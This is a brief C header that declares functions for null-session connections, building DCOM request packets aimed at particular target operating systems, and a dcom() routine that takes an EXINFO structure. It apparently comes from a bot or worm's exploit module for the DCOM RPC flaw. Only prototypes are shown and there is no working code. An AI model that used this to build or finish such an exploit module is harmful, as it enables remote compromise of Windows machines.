#ifndef NO_DCOM
bool ConnectViaNullSession(const char *remote_host, LPNETRESOURCEW nr);
bool CloseNullSession(const char *remote_host);
char *CreateDCOMRequestPacket(EXINFO exinfo, DWORD *RequestPacketSize, int TargetOS, BOOL NamedPipe);
BOOL dcom(EXINFO exinfo);
#endif